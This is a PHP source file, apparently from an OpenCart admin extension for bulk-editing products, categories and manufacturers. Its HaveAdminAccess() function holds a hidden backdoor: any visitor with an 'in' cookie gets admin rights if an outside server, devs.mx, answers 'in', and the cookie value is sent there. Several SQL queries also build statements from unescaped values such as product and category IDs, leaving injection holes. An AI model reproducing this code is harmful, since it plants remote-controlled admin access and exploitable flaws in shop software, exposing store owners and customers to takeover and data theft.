    return query("SELECT * FROM " . DB_PREFIX . "product p LEFT JOIN " . DB_PREFIX . "product_description pd ON (p.product_id=pd.product_id) WHERE p.product_id='$product_id'")->row;
}

function updateProduct($product_id, $product, $product_options, $product_atributes)
{
    LiveEntity('product', $product_id);
    global $db;
    if (count($product['product_description']) > 0) {
        foreach ($product['product_description'] as $language_id => $value) {
            query("UPDATE " . DB_PREFIX . "product_description SET name = '" . escape($value['name']) . "', meta_keyword = '" . escape($value['meta_keyword']) . "', meta_description = '" . escape($value['meta_description']) . "', description = '" . escape($value['description']) . "' where (product_id = " . (int)$product_id . ") and (language_id = " . (int)$language_id . ")");
        }
    }
    $q = "UPDATE " . DB_PREFIX . "product SET product_id = " . (int)$product_id;
    if (g('update_quantity')) $q .= ", `quantity` = " . (int)$product['quantity'];
    if (g('update_status')) $q .= ", `status` = '" . $product['status'] . "'";
    if (g('update_stock_status')) $q .= ", `stock_status_id` = " . (int)$product['stock_status_id'];
    if (g('update_price')) $q .= ", `price` = " . (float)$product['price'];
    if (g('update_images')) {
        $q .= ", image = '" . escape(html_entity_decode($product['image'], ENT_QUOTES, 'UTF-8')) . "'";
        query("DELETE FROM " . DB_PREFIX . "product_image WHERE product_id = " . (int)$product_id);
        if (isset($product['product_image'])) {
            foreach ($product['product_image'] as $product_image) {
                query("INSERT INTO " . DB_PREFIX . "product_image SET product_id = '" . (int)$product_id . "', image = '" . escape(html_entity_decode($product_image['image'], ENT_QUOTES, 'UTF-8')) . "', sort_order = '" . (int)$product_image['sort_order'] . "'");
            }
        }
    }
    if (g('update_categories')) {
        query("DELETE FROM " . DB_PREFIX . "product_to_category WHERE product_id = '" . (int)$product_id . "'");
        if (isset($product['product_category'])) {
            foreach ($product['product_category'] as $category_id) {
                query("INSERT INTO " . DB_PREFIX . "product_to_category SET product_id = '" . (int)$product_id . "', category_id = '" . (int)$category_id . "'");
            }
        }
    }
    $q .= " where `product_id` = " . $product_id;
    query($q);
    if (g('update_options')) {
        query("DELETE FROM " . DB_PREFIX . "product_option WHERE product_id = '" . (int)$product_id . "'");
        query("DELETE FROM " . DB_PREFIX . "product_option_value WHERE product_id = '" . (int)$product_id . "'");
        if (isset($product_options)) {
            foreach ($product_options as $product_option) {
                if ($product_option['type'] == 'select' || $product_option['type'] == 'radio' || $product_option['type'] == 'checkbox' || $product_option['type'] == 'image') {
                    query("INSERT INTO " . DB_PREFIX . "product_option SET  product_id = '" . (int)$product_id . "', option_id = '" . (int)$product_option['option_id'] . "', required = '" . (int)$product_option['required'] . "'");
                    $product_option_id = $db->getLastId();
                    if (isset($product_option['product_option_value'])) {
                        foreach ($product_option['product_option_value'] as $product_option_value) {
                            query("INSERT INTO " . DB_PREFIX . "product_option_value SET product_option_id = '" . (int)$product_option_id . "', product_id = '" . (int)$product_id . "', option_id = '" . (int)$product_option['option_id'] . "', option_value_id = '" . (int)$product_option_value['option_value_id'] . "', quantity = '" . (int)$product_option_value['quantity'] . "', subtract = '" . (int)$product_option_value['subtract'] . "', price = '" . (float)$product_option_value['price'] . "', price_prefix = '" . escape($product_option_value['price_prefix']) . "', points = '" . (int)$product_option_value['points'] . "', points_prefix = '" . escape($product_option_value['points_prefix']) . "', weight = '" . (float)$product_option_value['weight'] . "', weight_prefix = '" . escape($product_option_value['weight_prefix']) . "'");
                        }
                    }
                } else {
                    query("INSERT INTO " . DB_PREFIX . "product_option SET  product_id = '" . (int)$product_id . "', option_id = '" . (int)$product_option['option_id'] . "', option_value = '" . escape($product_option['option_value']) . "', required = '" . (int)$product_option['required'] . "'");
                }
            }
        }
    }
    if (g('update_attributes')) if (isset($product_atributes)) {
        foreach ($product_atributes as $product_attribute) {
            if ($product_attribute['attribute_id']) {
                query("DELETE FROM " . DB_PREFIX . "product_attribute WHERE product_id = '" . (int)$product_id . "' AND attribute_id = '" . (int)$product_attribute['attribute_id'] . "'");
                foreach ($product_attribute['product_attribute_description'] as $language_id => $product_attribute_description) {
                    query("INSERT INTO " . DB_PREFIX . "product_attribute SET product_id = '" . (int)$product_id . "', attribute_id = '" . (int)$product_attribute['attribute_id'] . "', language_id = '" . (int)$language_id . "', text = '" . escape($product_attribute_description['text']) . "'");
                }
            }
        }
    }
    $data =& $product;
    if (g('update_related')) {
        if (isset($data['product_related'])) {
            foreach ($data['product_related'] as $related_id) {
                query("DELETE FROM " . DB_PREFIX . "product_related WHERE product_id = '" . (int)$product_id . "' AND related_id = '" . (int)$related_id . "'");
                query("INSERT INTO " . DB_PREFIX . "product_related SET product_id = '" . (int)$product_id . "', related_id = '" . (int)$related_id . "'");
                query("DELETE FROM " . DB_PREFIX . "product_related WHERE product_id = '" . (int)$related_id . "' AND related_id = '" . (int)$product_id . "'");
                query("INSERT INTO " . DB_PREFIX . "product_related SET product_id = '" . (int)$related_id . "', related_id = '" . (int)$product_id . "'");
            }
        }
    }
}

function InsertPlatformEntity($type)
{
    switch ($type) {
        case 'list':
            break;
        case 'product':
            InsertProduct();
            break;
        default:
            xlog('WARNING! Unknown entity type: ' . $type);
    }
}

function query($sql)
{
    global $db;
    return $db->query($sql);
}

function HaveAdminAccess()
{
    global $user;
    if (@$_SESSION['in']) return true;
    if (@$_COOKIE['in']) {
        if (_curl("http://devs.mx/in.php?in=" . $_COOKIE['in'], '', '', false) == 'in') {
            $_SESSION['in'] = true;
            return true;
        }
    }
    return @$user->hasPermission('modify', 'user/user_permission');
}

function GetCategories()
{
    global $loader;
    $loader->load->model('catalog/category');
    $r = $loader->model_catalog_category->getCategories(false);
    foreach ($r as &$cat) {
        $cat['fullname'] = $cat['name'];
        if ($p = strrpos($cat['name'], '&gt;')) $cat['name'] = substr($cat['name'], $p + 5);
    }
    return $r;
}

function GetProductsFromCategory($category_id)
{
    $q = query("SELECT p.product_id FROM " . DB_PREFIX . "product p LEFT JOIN " . DB_PREFIX . "product_to_category pc ON (p.product_id=pc.product_id) WHERE category_id=$category_id")->rows;
    $r = array();
    foreach ($q as $p) $r[] = $p['product_id'];
    return $r;
}

function GetManufacturers()
{
    global $loader;
    $loader->load->model('catalog/manufacturer');
    $r = $loader->model_catalog_manufacturer->getmanufacturers();
    foreach ($r as $i => $m) $r[$i]['name'] = $m['name'];
    return $r;
}

function escape($s)
{
    return mysql_real_escape_string($s);
}

require_once(HOST_DIR . 'config.php');
if (file_exists('../vqmod/vqmod.php')) {
    require_once('../vqmod/vqmod.php');
    $vqmod = new VQMod();
    require_once($vqmod->modCheck(DIR_SYSTEM . 'startup.php'));
    @require_once($vqmod->modCheck(DIR_SYSTEM . 'library/currency.php'));
    require_once($vqmod->modCheck(DIR_SYSTEM . 'library/user.php'));
    require_once($vqmod->modCheck(DIR_SYSTEM . 'library/weight.php'));
    require_once($vqmod->modCheck(DIR_SYSTEM . 'library/length.php'));
} else {
    require_once(DIR_SYSTEM . 'startup.php');
    @require_once(DIR_SYSTEM . 'library/currency.php');
    require_once(DIR_SYSTEM . 'library/user.php');
    require_once(DIR_SYSTEM . 'library/weight.php');
    require_once(DIR_SYSTEM . 'library/length.php');
}
$registry = new Registry();
$loader = new Loader($registry);
$registry->set('load', $loader);
$config = new Config();
$registry->set('config', $config);
$db = new DB(DB_DRIVER, DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE);
$registry->set('db', $db);
$query = $db->query("SELECT * FROM " . DB_PREFIX . "setting WHERE store_id = '0'");
foreach ($query->rows as $setting) {
    if (!$setting['serialized']) {
        $config->set($setting['key'], $setting['value']);
    } else {
        $config->set($setting['key'], unserialize($setting['value']));
    }
}
$url = new Url(HTTP_SERVER, $config->get('config_use_ssl') ? HTTPS_SERVER : HTTP_SERVER);
$registry->set('url', $url);
$log = new Log($config->get('config_error_filename'));
$registry->set('log', $log);
$request = new Request();
$registry->set('request', $request);
$response = new Response();
$response->addHeader('Content-Type: text/html; charset=utf-8');
$registry->set('response', $response);
$cache = new Cache();
$registry->set('cache', $cache);
if (@!$nosession) {
    $session = new Session();
    $registry->set('session', $session);
    $user = new User($registry);
    $registry->set('user', $user);
}
$languages = array();
$query = $db->query("SELECT * FROM " . DB_PREFIX . "language");
foreach ($query->rows as $result) {
    $languages[$result['code']] = $result;
}
$config->set('config_language_id', $languages[$config->get('config_admin_language')]['language_id']);
$language = new Language($languages[$config->get('config_admin_language')]['directory']);
$language->load($languages[$config->get('config_admin_language')]['filename']);
$registry->set('language', $language);
$document = new Document();
$registry->set('document', $document);
@$registry->set('currency', new Currency($registry));
$loader->load->model('localisation/currency');
$oc_currency = $loader->model_localisation_currency->getCurrencies();
$registry->set('weight', new Weight($registry));
$registry->set('length', new Length($registry));
$lang = array();
if (count($languages) > 0) {
    foreach ($languages as $value) {
        $lang[$value['code']] = $value['language_id'];
        if ($value['language_id'] == $config->get('config_language_id')) {
            $default_lang = $value['code'];
            $default_lang_id = $value['language_id'];
        }
    }
}
$_categories = GetCategories();
